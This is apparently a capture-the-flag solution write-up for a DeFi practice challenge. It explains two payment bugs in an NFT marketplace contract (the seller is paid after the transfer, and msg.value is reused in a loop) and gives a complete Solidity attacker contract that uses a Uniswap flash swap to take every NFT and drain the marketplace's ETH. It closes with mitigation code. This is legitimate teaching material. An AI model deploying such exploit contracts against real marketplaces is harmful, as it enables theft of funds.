# Free Rider - Solution

## Challenge Overview

An NFT marketplace has listed 6 NFTs for sale at 15 ETH each (90 ETH total). A critical vulnerability has been reported, and there's a 45 ETH bounty for recovering the NFTs.

**Initial conditions:**
- Marketplace: 6 NFTs at 15 ETH each + 90 ETH balance
- Player: Only 0.1 ETH
- Recovery Manager: 45 ETH bounty for NFT recovery
- Uniswap V2 Pool: 15,000 DVT + 9,000 WETH liquidity

## The Vulnerability

### Bug 1: Payment After Transfer (Critical)

In `_buyOne()`:

```solidity
// transfer from seller to buyer
_token.safeTransferFrom(_token.ownerOf(tokenId), msg.sender, tokenId);

// pay seller using cached token
payable(_token.ownerOf(tokenId)).sendValue(priceToPay);
```

**The problem**: `ownerOf(tokenId)` is called AFTER the transfer, so it returns the **buyer's address** instead of the seller's! The marketplace pays the buyer, not the seller.

### Bug 2: msg.value Reuse

In `buyMany()`, the `msg.value < priceToPay` check in `_buyOne()` is performed multiple times but `msg.value` never decreases. With 15 ETH, you can pass the check for ALL 6 NFTs and:
1. Pay 15 ETH to buy NFT #0
2. Receive 15 ETH back (paid to yourself as "owner")
3. Repeat for all 6 NFTs
4. Net result: You have all 6 NFTs and 90 ETH!

## Exploit Strategy

1. **Flash swap** 15 WETH from Uniswap V2
2. **Unwrap** WETH to ETH
3. **Buy all 6 NFTs** with 15 ETH (marketplace pays us 90 ETH)
4. **Send NFTs** to recovery manager for 45 ETH bounty
5. **Repay** flash swap (~15.05 ETH with fee)
6. **Profit**: ~120 ETH from 0.1 ETH initial balance

## Solution Code

```solidity
contract FreeRiderAttacker is IUniswapV2Callee, IERC721Receiver {
    IUniswapV2Pair private pair;
    WETH private weth;
    FreeRiderNFTMarketplace private marketplace;
    DamnValuableNFT private nft;
    FreeRiderRecoveryManager private recoveryManager;
    address private player;

    uint256 constant NFT_PRICE = 15 ether;
    uint256 constant AMOUNT_OF_NFTS = 6;

    function attack() external {
        // Initiate flash swap for 15 WETH
        pair.swap(NFT_PRICE, 0, address(this), abi.encode("flash"));
    }

    function uniswapV2Call(address, uint256 amount0, uint256, bytes calldata) external {
        require(msg.sender == address(pair), "Not pair");

        // Step 1: Unwrap WETH to ETH
        weth.withdraw(amount0);

        // Step 2: Buy all 6 NFTs with just 15 ETH
        uint256[] memory tokenIds = new uint256[](AMOUNT_OF_NFTS);
        for (uint256 i = 0; i < AMOUNT_OF_NFTS; i++) {
            tokenIds[i] = i;
        }
        marketplace.buyMany{value: NFT_PRICE}(tokenIds);

        // Step 3: Send NFTs to recovery manager for bounty
        bytes memory data = abi.encode(player);
        for (uint256 i = 0; i < AMOUNT_OF_NFTS; i++) {
            nft.safeTransferFrom(address(this), address(recoveryManager), i, data);
        }

        // Step 4: Repay flash swap (amount + 0.3% fee)
        uint256 repayAmount = (amount0 * 1000 / 997) + 1;
        weth.deposit{value: repayAmount}();
        weth.transfer(address(pair), repayAmount);

        // Step 5: Send remaining ETH to player
        payable(player).transfer(address(this).balance);
    }

    function onERC721Received(address, address, uint256, bytes memory) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
```

## Attack Flow Diagram

```
Player (0.1 ETH)
    │
    ▼
Deploy Attacker Contract
    │
    ▼
Flash Swap 15 WETH from Uniswap
    │
    ▼
Unwrap to 15 ETH
    │
    ▼
buyMany([0,1,2,3,4,5]) with 15 ETH
    │
    ├── Buy NFT #0: Pay 15 ETH, receive NFT, get 15 ETH back
    ├── Buy NFT #1: Pass check (msg.value still 15), get NFT + 15 ETH
    ├── ... (same for NFTs #2-5)
    │
    ▼
Total: 6 NFTs + 90 ETH (from marketplace)
    │
    ▼
Send NFTs to Recovery Manager → Receive 45 ETH bounty
    │
    ▼
Repay ~15.05 WETH to Uniswap
    │
    ▼
Send remaining ~120 ETH to player
```

## Financial Summary

| Step | ETH In | ETH Out |
|------|--------|---------|
| Flash swap | +15 WETH | - |
| Buy 6 NFTs | -15 ETH | +90 ETH |
| Bounty | - | +45 ETH |
| Repay flash | - | -15.05 ETH |
| **Net Profit** | | **~120 ETH** |

## Mitigation Recommendations

1. **Fix payment order**: Get seller address BEFORE transfer
   ```solidity
   address seller = _token.ownerOf(tokenId);
   _token.safeTransferFrom(seller, msg.sender, tokenId);
   payable(seller).sendValue(priceToPay);
   ```

2. **Track cumulative cost**: In `buyMany()`, accumulate total price and check against `msg.value`
   ```solidity
   uint256 totalCost;
   for (uint256 i = 0; i < tokenIds.length; ++i) {
       totalCost += offers[tokenIds[i]];
       _buyOne(tokenIds[i]);
   }
   require(msg.value >= totalCost, "Insufficient payment");
   ```

3. **Use pull over push**: Instead of sending ETH immediately, let sellers withdraw their earnings

